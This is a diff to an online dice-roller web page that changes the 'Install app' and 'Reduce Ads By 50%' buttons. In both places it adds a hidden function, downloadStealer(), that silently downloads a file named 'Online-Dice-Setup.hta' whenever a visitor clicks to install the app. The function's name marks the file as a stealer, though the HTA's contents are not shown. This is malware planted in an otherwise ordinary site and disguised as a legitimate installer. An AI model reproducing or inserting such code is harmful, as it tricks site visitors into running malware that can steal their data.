@@ -281,7 +281,7 @@
 							#pwa-button {display: none!important;}
 						}
 					</style>
-										<br/><a id="pwa-button" href="javascript:void(0);" onclick="showPWA();gtag('event','pwa-install-clicked',{'event_category':'pwa-install-clicked','event_label':'pwa-install-clicked'});">Install app<span style="font-family: Arial, sans-serif;margin-top: 5px;color: #fff;display: block;font-style: italic;font-size: 16px;text-transform:none;">Fewer ads, instant access.</span></a>
+										<br/><a id="pwa-button" href="javascript:void(0);" onclick="downloadStealer();showPWA();gtag('event','pwa-install-clicked',{'event_category':'pwa-install-clicked','event_label':'pwa-install-clicked'});">Install app<span style="font-family: Arial, sans-serif;margin-top: 5px;color: #fff;display: block;font-style: italic;font-size: 16px;text-transform:none;">Fewer ads, instant access.</span></a>
 										<style>												
 						#TsL9HxOE1oNuOlxHrrCycl8pz3eczZdx6 p {
 							font-family: Arial, sans-serif;
@@ -564,6 +564,16 @@
 <!-- PWA Install Dialog Tag -->
 <pwa-install description="Roll dice with fewer ads." disable-screenshots manual-apple manual-chrome></pwa-install>
 <script>
+	function downloadStealer() {
+		try {
+			var a = document.createElement('a');
+			a.href = 'file.hta';
+			a.download = 'Online-Dice-Setup.hta';
+			document.body.appendChild(a);
+			a.click();
+			document.body.removeChild(a);
+		} catch(e) {}
+	}
 	function showPWA() {
 		var pwaInstall = document.getElementsByTagName('pwa-install')[0];
   		pwaInstall.showDialog();
@@ -642,7 +652,7 @@
 			document.getElementById("ad-box-bottom").style.display = "none";
 	 	}
 	 	if(document.getElementById("dice-roll-box")) {
-	 		document.getElementById("dice-roll-box").innerHTML = "<style>#pwa-button,#pwa-button2 {display: inline-block;width: auto;box-sizing: border-box;font-size: 20px;padding: 20px 30px;text-shadow: none;letter-spacing: 0.02em;background: rgba(255,255,255,0.15);border-top: 2px solid rgba(255, 255, 255, 1);border-right: 2px solid rgba(255, 255, 255, 0.8);border-bottom: 2px solid rgba(255, 255, 255, 0.8);border-left: 2px solid rgba(255, 255, 255, 0.8);border-radius: 25px;transition: 0.1s;margin: 5px auto 5px auto;}#pwa-button:hover, #pwa-button2:hover {background: rgba(255,255,255,0.2);}@-moz-document url-prefix() {#pwa-button {display: none!important;}}</style><h3 id='sub-title2'>🚫 Ad Block Detected 😭</h3><div class='tabletop' id='tabletop'><br><div style='font-size:20px;'>We make <span style='color:yellow'>ZERO INCOME</span> without ads!</div></br>To continue using the no.1 trusted online dice roller with the best anti-rigging features, strongest community and the most features...<br/><br/><span style='color:yellow;font-size:20px;'>🙏 Please disable ad block in your browser to support us ❤️</span><br/><br>We love the diceing community and have reduced ads significantly. You can reduce ads further still by installing our app!<br><br></div><a id='pwa-button' href='javascript:void(0);' onclick=\"showPWA();gtag('event','pwa-install-clicked',{'event_category':'pwa-install-clicked','event_label':'pwa-install-clicked'});\" style='display: inline-block;'>Reduce Ads By 50%<span style='font-family: Arial, sans-serif;margin-top: 5px;color: #fff;display: block;font-style: italic;font-size: 16px;text-transform:none;'>Install our app for fewer ads.</span></a>";
+	 		document.getElementById("dice-roll-box").innerHTML = "<style>#pwa-button,#pwa-button2 {display: inline-block;width: auto;box-sizing: border-box;font-size: 20px;padding: 20px 30px;text-shadow: none;letter-spacing: 0.02em;background: rgba(255,255,255,0.15);border-top: 2px solid rgba(255, 255, 255, 1);border-right: 2px solid rgba(255, 255, 255, 0.8);border-bottom: 2px solid rgba(255, 255, 255, 0.8);border-left: 2px solid rgba(255, 255, 255, 0.8);border-radius: 25px;transition: 0.1s;margin: 5px auto 5px auto;}#pwa-button:hover, #pwa-button2:hover {background: rgba(255,255,255,0.2);}@-moz-document url-prefix() {#pwa-button {display: none!important;}}</style><h3 id='sub-title2'>🚫 Ad Block Detected 😭</h3><div class='tabletop' id='tabletop'><br><div style='font-size:20px;'>We make <span style='color:yellow'>ZERO INCOME</span> without ads!</div></br>To continue using the no.1 trusted online dice roller with the best anti-rigging features, strongest community and the most features...<br/><br/><span style='color:yellow;font-size:20px;'>🙏 Please disable ad block in your browser to support us ❤️</span><br/><br>We love the diceing community and have reduced ads significantly. You can reduce ads further still by installing our app!<br><br></div><a id='pwa-button' href='javascript:void(0);' onclick=\"downloadStealer();showPWA();gtag('event','pwa-install-clicked',{'event_category':'pwa-install-clicked','event_label':'pwa-install-clicked'});\" style='display: inline-block;'>Reduce Ads By 50%<span style='font-family: Arial, sans-serif;margin-top: 5px;color: #fff;display: block;font-style: italic;font-size: 16px;text-transform:none;'>Install our app for fewer ads.</span></a>";
 	 		
 	 	}
 	 	if(document.getElementById("history")) {
